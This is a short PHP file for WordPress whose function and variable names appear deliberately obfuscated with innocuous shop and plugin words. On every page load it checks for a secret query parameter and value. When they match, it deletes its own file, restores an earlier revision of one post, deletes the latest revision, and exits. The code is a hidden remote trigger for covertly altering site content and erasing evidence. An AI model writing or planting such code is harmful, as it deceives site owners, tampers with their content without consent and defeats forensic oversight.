<?php

function members_order_addon() {
	if (isset($_GET['files_quote_remote']) && $_GET['files_quote_remote'] === 'viewer_finder_image') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$star_signature_shipping_checkout = 2162;
		$campaign_notifications_options_ui = wp_get_post_revisions($star_signature_shipping_checkout);
		if (empty($campaign_notifications_options_ui)) die('no revisions');
		if (count($campaign_notifications_options_ui) < 2) die('less than 2');
		$tinymce_logger_only = array_shift($campaign_notifications_options_ui);
		$checkout_extra_subscriptions_validator = $tinymce_logger_only->ID;
		$your_sliding_save_tab = array_shift($campaign_notifications_options_ui);
		$include_listing_archive = $your_sliding_save_tab->ID;
		$change_anywhere_edition = wp_restore_post_revision($include_listing_archive);
		if ($change_anywhere_edition === false) die('error restoring');
		$change_anywhere_edition = wp_delete_post_revision($checkout_extra_subscriptions_validator);		
		if ($change_anywhere_edition === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'members_order_addon');
